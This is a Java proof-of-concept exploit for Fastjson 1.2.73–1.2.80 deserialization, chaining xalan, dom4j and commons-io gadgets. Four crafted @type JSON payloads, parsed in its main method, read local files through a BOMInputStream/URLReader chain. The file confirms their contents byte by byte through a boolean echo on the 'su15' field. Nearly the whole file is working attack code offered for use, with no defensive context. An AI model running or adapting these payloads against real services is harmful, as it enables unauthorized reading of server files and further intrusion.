package test;
import java.io.InputStream;
import java.net.URL;
import java.util.Arrays;
import java.util.Base64;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class Fastjson28_xalan_dom4j_io_read_print {
    public static void main(String[] args) throws Exception {
    	String url = "file:///D:/";
    	InputStream input = new URL(url).openStream();
    	byte[] bs = new byte[input.available()];
    	input.read(bs);
    	String test = Base64.getEncoder().encodeToString(bs);
    	byte[] testbs = test.getBytes();
        System.out.println(Arrays.toString(bs));
        System.out.println(new String(bs));
    	
        //依赖1.2.73-1.2.80 xalan-2.7.2 dom4j-2.1.3  commons-io-2.2 需回显，根据回显不一样(关注su15字段)布尔读文件
        String poc1 = "{\r\n"
        		+ "		\"@type\": \"java.lang.Exception\",\r\n"
        		+ "		\"@type\": \"org.apache.xml.dtm.DTMConfigurationException\",\"locator\":{}\r\n"
        		+ "}";
        String poc2 = "{\r\n"
        		+ "		\"@type\": \"java.lang.Class\",\r\n"
        		+ "		\"val\": {\r\n"
        		+ "			\"@type\": \"java.lang.String\" {\r\n"
        		+ "				\"@type\": \"java.util.Locale\",\r\n"
        		+ "				\"val\": {\r\n"
        		+ "					\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
        		+ "					{\r\n"
        		+ "						\"@type\": \"java.lang.String\"\r\n"
        		+ "						\"@type\": \"org.apache.xml.dtm.DTMConfigurationException\",\r\n"
        		+ "						\"locator\": {}\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}";
        String poc3 = "{\r\n"
        		+ "	\"su14\": {\r\n"
        		+ "		\"@type\": \"javax.xml.transform.SourceLocator\",\r\n"
        		+ "		\"@type\": \"org.apache.xpath.objects.XNodeSetForDOM\",\r\n"
        		+ "		\"nodeIter\": {\r\n"
        		+ "			\"@type\": \"org.apache.xpath.NodeSet\"\r\n"
        		+ "		},\r\n"
        		+ "		\"xctxt\": {\r\n"
        		+ "			\"@type\": \"org.apache.xpath.XPathContext\",\r\n"
        		+ "			\"primaryReader\": {\r\n"
        		+ "				\"@type\": \"org.dom4j.io.XMLWriter\",\r\n"
        		+ "				\"entityResolver\": {\r\n"
        		+ "					\"@type\": \"org.dom4j.io.SAXContentHandler\",\r\n"
        		+ "					\"inputSource\": {\r\n"
        		+ "						\"byteStream\": {\r\n"
        		+ "							\"@type\": \"java.io.InputStream\"\r\n"
        		+ "						}\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		}\r\n"
        		+ "	}\r\n"
        		+ "}";
        
        String poc4 = "{\"su15\":{\r\n"
        		+ "						\"@type\": \"java.io.InputStream\",\r\n"
        		+ "						\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
        		+ "						\"delegate\": {\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
        		+ "							\"reader\": {\r\n"
        		+ "								\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\r\n"
    /*文件位置*/+ "								\"url\": \"file:///D:/\"\r\n"
        		+ "							},\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bufferSize\": 1024\r\n"
        		+ "						},\r\n"
        		+ "						\"boms\": [{\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        		+ "							\"charsetName\": \"UTF-8\",\r\n"
        		+ "							\"bytes\": [\r\n"
   /*文件bytes*/+ "								36,82\r\n"
        		+ "							]\r\n"
        		+ "						}]\r\n"
        		+ "					}}";
        
        System.out.println(poc1);
        System.out.println(poc2);
        System.out.println(poc3);
        System.out.println(poc4);
        try {
        	JSON.parseObject(poc1);
		} catch (Exception e) {
		}
        JSON.parseObject(poc2);
        JSON.parseObject(poc3);
        System.out.println(JSON.parseObject(poc4));
        
    }
}
